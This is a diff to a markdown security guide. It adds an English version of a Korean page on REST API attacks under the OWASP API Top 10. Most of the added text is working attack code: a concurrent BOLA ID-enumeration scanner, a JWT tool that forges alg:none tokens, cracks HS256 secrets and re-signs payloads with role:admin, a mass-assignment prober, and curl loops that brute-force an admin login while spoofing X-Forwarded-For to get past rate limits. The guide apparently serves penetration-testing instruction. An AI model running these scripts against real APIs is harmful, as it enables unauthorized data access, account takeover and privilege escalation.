@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # REST API 보안과 OWASP API Top 10
 
 ## 1. OWASP API Security Top 10 (2023)
@@ -424,3 +430,434 @@ done
 | `Burp Suite` | API 트래픽 인터셉트 |
 | `mitmproxy` | API 프록시 분석 |
 | `postman` | API 테스트 자동화 |
+
+---
+
+<a name="english"></a>
+
+# REST API Security and OWASP API Top 10
+
+## 1. OWASP API Security Top 10 (2023)
+
+| # | Vulnerability | Description |
+|---|---------------|-------------|
+| API1 | Broken Object Level Authorization | Insufficient object-level authorization — accessing other users' resources |
+| API2 | Broken Authentication | Authentication mechanism flaws — token exposure, weak credentials |
+| API3 | Broken Object Property Level Authorization | Insufficient property-level authorization — hidden field exposure |
+| API4 | Unrestricted Resource Consumption | No rate limiting — causes DoS and cost spikes |
+| API5 | Broken Function Level Authorization | Insufficient function-level authorization — access to admin endpoints |
+| API6 | Unrestricted Access to Sensitive Business Flows | Unrestricted access to sensitive business flows |
+| API7 | Server Side Request Forgery | SSRF — forging requests to internal services |
+| API8 | Security Misconfiguration | Security configuration errors — default credentials, unnecessary features |
+| API9 | Improper Inventory Management | Insufficient version management — exposure of legacy API endpoints |
+| API10 | Unsafe Consumption of APIs | Excessive trust in external APIs |
+
+---
+
+## 2. BOLA (Broken Object Level Authorization)
+
+### 2.1 Attack Patterns
+
+```bash
+# Normal request
+GET /api/v1/users/1001/profile
+Authorization: Bearer <token_user_1001>
+
+# BOLA attack — accessing with another user's ID
+GET /api/v1/users/1002/profile
+Authorization: Bearer <token_user_1001>
+
+# Sequential ID enumeration
+for id in $(seq 1000 1100); do
+  curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://api.target.com/v1/users/$id/profile" | jq .
+done
+```
+
+### 2.2 BOLA Scanner
+
+```python
+#!/usr/bin/env python3
+"""Automated BOLA vulnerability detection scanner."""
+
+import argparse
+import asyncio
+import json
+from dataclasses import dataclass
+from typing import Optional
+
+import httpx
+
+
+@dataclass
+class BOLAResult:
+    target_id: int | str
+    status_code: int
+    accessible: bool
+    data_snippet: str
+
+
+async def test_bola(
+    client: httpx.AsyncClient,
+    base_url: str,
+    endpoint_template: str,
+    test_id: int | str,
+    headers: dict[str, str],
+    own_id: int | str,
+) -> BOLAResult:
+    url = f"{base_url}{endpoint_template.format(id=test_id)}"
+    try:
+        resp = await client.get(url, headers=headers, timeout=10)
+        accessible = resp.status_code == 200 and str(test_id) != str(own_id)
+        snippet = resp.text[:200] if resp.status_code == 200 else ""
+        return BOLAResult(test_id, resp.status_code, accessible, snippet)
+    except httpx.RequestError as e:
+        return BOLAResult(test_id, 0, False, str(e))
+
+
+async def scan_bola(
+    base_url: str,
+    endpoint_template: str,
+    token: str,
+    own_id: str,
+    id_range: range,
+    concurrency: int = 20,
+) -> list[BOLAResult]:
+    headers = {"Authorization": f"Bearer {token}"}
+    semaphore = asyncio.Semaphore(concurrency)
+    results: list[BOLAResult] = []
+
+    async def bounded_test(tid: int) -> None:
+        async with semaphore:
+            r = await test_bola(client, base_url, endpoint_template, tid, headers, own_id)
+            if r.accessible:
+                print(f"[BOLA] ID {tid} accessible! Status: {r.status_code}")
+                print(f"  Snippet: {r.data_snippet[:100]}")
+            results.append(r)
+
+    async with httpx.AsyncClient(verify=False) as client:
+        await asyncio.gather(*[bounded_test(i) for i in id_range])
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="BOLA vulnerability scanner")
+    parser.add_argument("url", help="Target API base URL")
+    parser.add_argument("endpoint", help="Endpoint template (e.g., /api/v1/users/{id}/profile)")
+    parser.add_argument("-t", "--token", required=True, help="Authentication token")
+    parser.add_argument("--own-id", required=True, help="Your own resource ID")
+    parser.add_argument("--start", type=int, default=1, help="Start ID")
+    parser.add_argument("--end", type=int, default=100, help="End ID")
+    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Concurrent requests")
+    parser.add_argument("-o", "--output", help="Output JSON file")
+    args = parser.parse_args()
+
+    results = asyncio.run(
+        scan_bola(
+            args.url, args.endpoint, args.token, args.own_id,
+            range(args.start, args.end + 1), args.concurrency,
+        )
+    )
+
+    accessible = [r for r in results if r.accessible]
+    print(f"\nTotal {len(results)} tested / {len(accessible)} BOLA vulnerable")
+
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump([vars(r) for r in accessible], f, indent=2)
+        print(f"Results saved: {args.output}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. JWT Vulnerability Analysis
+
+### 3.1 Common JWT Attacks
+
+```bash
+# Decode JWT structure
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.xxx" \
+  | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# Algorithm none attack
+python3 -c "
+import base64, json
+header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+payload = base64.b64encode(json.dumps({'sub':'1234','role':'admin'}).encode()).rstrip(b'=').decode()
+print(f'{header}.{payload}.')
+"
+
+# Weak secret cracking (hashcat)
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 3.2 JWT Analysis and Tampering CLI
+
+```python
+#!/usr/bin/env python3
+"""JWT vulnerability analysis and tampering tool."""
+
+import argparse
+import base64
+import hmac
+import json
+import hashlib
+from pathlib import Path
+
+
+def b64_decode(s: str) -> bytes:
+    padding = 4 - len(s) % 4
+    return base64.urlsafe_b64decode(s + "=" * padding)
+
+
+def b64_encode(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def decode_jwt(token: str) -> tuple[dict, dict, str]:
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT format")
+    header = json.loads(b64_decode(parts[0]))
+    payload = json.loads(b64_decode(parts[1]))
+    return header, payload, parts[2]
+
+
+def forge_none_alg(token: str, new_payload: dict | None = None) -> str:
+    header, payload, _ = decode_jwt(token)
+    header["alg"] = "none"
+    if new_payload:
+        payload.update(new_payload)
+    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
+    return f"{h}.{p}."
+
+
+def crack_hs256(token: str, wordlist: Path) -> str | None:
+    header, payload, sig = decode_jwt(token)
+    parts = token.rsplit(".", 1)
+    message = parts[0].encode()
+    target_sig = b64_decode(sig)
+    with wordlist.open() as f:
+        for line in f:
+            secret = line.strip().encode()
+            computed = hmac.new(secret, message, hashlib.sha256).digest()
+            if computed == target_sig:
+                return line.strip()
+    return None
+
+
+def resign_hs256(token: str, secret: str, new_payload: dict | None = None) -> str:
+    header, payload, _ = decode_jwt(token)
+    if new_payload:
+        payload.update(new_payload)
+    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
+    message = f"{h}.{p}".encode()
+    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
+    return f"{h}.{p}.{b64_encode(sig)}"
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="JWT vulnerability analysis tool")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    dec = sub.add_parser("decode", help="Decode JWT")
+    dec.add_argument("token")
+
+    none_p = sub.add_parser("none", help="alg:none attack")
+    none_p.add_argument("token")
+    none_p.add_argument("--payload", help="Payload JSON to modify")
+
+    crack_p = sub.add_parser("crack", help="HS256 secret cracking")
+    crack_p.add_argument("token")
+    crack_p.add_argument("wordlist", type=Path)
+
+    resign_p = sub.add_parser("resign", help="HS256 re-signing")
+    resign_p.add_argument("token")
+    resign_p.add_argument("secret")
+    resign_p.add_argument("--payload", help="Payload JSON to modify")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "decode":
+            h, p, _ = decode_jwt(args.token)
+            print("Header:", json.dumps(h, indent=2, ensure_ascii=False))
+            print("Payload:", json.dumps(p, indent=2, ensure_ascii=False))
+        case "none":
+            new_p = json.loads(args.payload) if args.payload else None
+            print(forge_none_alg(args.token, new_p))
+        case "crack":
+            secret = crack_hs256(args.token, args.wordlist)
+            print(f"Secret found: {secret}" if secret else "Secret not found")
+        case "resign":
+            new_p = json.loads(args.payload) if args.payload else None
+            print(resign_hs256(args.token, args.secret, new_p))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. API Information Gathering
+
+### 4.1 Swagger/OpenAPI Discovery
+
+```bash
+# Common API documentation paths
+wordlist=(
+  "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
+  "/api/swagger.json" "/api/docs" "/api/v1/docs"
+  "/openapi.json" "/openapi.yaml"
+  "/api-docs" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
+  "/redoc" "/graphql" "/graphiql"
+)
+
+for path in "${wordlist[@]}"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
+  [ "$code" == "200" ] && echo "[+] $path ($code)"
+done
+```
+
+### 4.2 HTTP Method Enumeration
+
+```bash
+# Check allowed HTTP methods
+curl -s -X OPTIONS https://api.target.com/v1/users \
+  -H "Authorization: Bearer $TOKEN" -I | grep -i allow
+
+# Method fuzzing
+for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
+    https://api.target.com/v1/users)
+  echo "$method: $code"
+done
+```
+
+---
+
+## 5. Mass Assignment Attack
+
+```python
+#!/usr/bin/env python3
+"""Mass Assignment vulnerability detection."""
+
+import argparse
+import json
+import httpx
+
+
+DANGEROUS_FIELDS = [
+    "role", "admin", "is_admin", "isAdmin", "privilege",
+    "permissions", "group", "verified", "active", "status",
+    "balance", "credit", "price", "discount",
+]
+
+
+def test_mass_assignment(
+    url: str,
+    method: str,
+    base_payload: dict,
+    token: str,
+) -> dict[str, int]:
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Content-Type": "application/json",
+    }
+    results: dict[str, int] = {}
+
+    for field in DANGEROUS_FIELDS:
+        test_payload = {**base_payload, field: True}
+        with httpx.Client(verify=False) as client:
+            resp = getattr(client, method.lower())(
+                url, json=test_payload, headers=headers, timeout=10
+            )
+            if resp.status_code in (200, 201, 204):
+                try:
+                    body = resp.json()
+                    if field in str(body):
+                        print(f"[VULN] Mass Assignment: field '{field}' was reflected")
+                        results[field] = resp.status_code
+                except Exception:
+                    pass
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Mass Assignment detection")
+    parser.add_argument("url", help="Target endpoint URL")
+    parser.add_argument("-m", "--method", default="POST", choices=["POST", "PUT", "PATCH"])
+    parser.add_argument("-p", "--payload", required=True, help="Base request payload JSON")
+    parser.add_argument("-t", "--token", required=True)
+    args = parser.parse_args()
+
+    base_payload = json.loads(args.payload)
+    results = test_mass_assignment(args.url, args.method, base_payload, args.token)
+    print(f"\n{len(results)} vulnerable fields found: {list(results.keys())}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. API Version Enumeration and Legacy Version Attacks
+
+```bash
+# API version enumeration
+for ver in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 beta alpha dev; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    "https://api.target.com/$ver/users")
+  [ "$code" != "404" ] && echo "[+] /api/$ver/users: $code"
+done
+
+# Attempt authentication bypass on legacy API version
+curl -s https://api.target.com/v1/admin/users \
+  -H "Authorization: Bearer $OLD_TOKEN"
+```
+
+---
+
+## 7. Rate Limiting Bypass
+
+```bash
+# Bypass rate limit via IP rotation
+for i in $(seq 1 100); do
+  curl -s -X POST https://api.target.com/v1/auth/login \
+    -H "X-Forwarded-For: 10.0.0.$i" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"password'$i'"}' &
+done
+wait
+
+# Attempt IP spoofing with various headers
+for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "CF-Connecting-IP"; do
+  curl -s -X POST https://api.target.com/v1/auth/login \
+    -H "$header: 1.2.3.4" \
+    -d '{"username":"admin","password":"test"}'
+done
+```
+
+---
+
+## 8. Reference Tools
+
+| Tool | Purpose |
+|------|---------|
+| `ffuf` | API endpoint fuzzing |
+| `arjun` | Hidden parameter discovery |
+| `kiterunner` | Automated API path discovery |
+| `jwt_tool` | JWT vulnerability analysis |
+| `Burp Suite` | API traffic interception |
+| `mitmproxy` | API proxy analysis |
+| `postman` | API test automation |
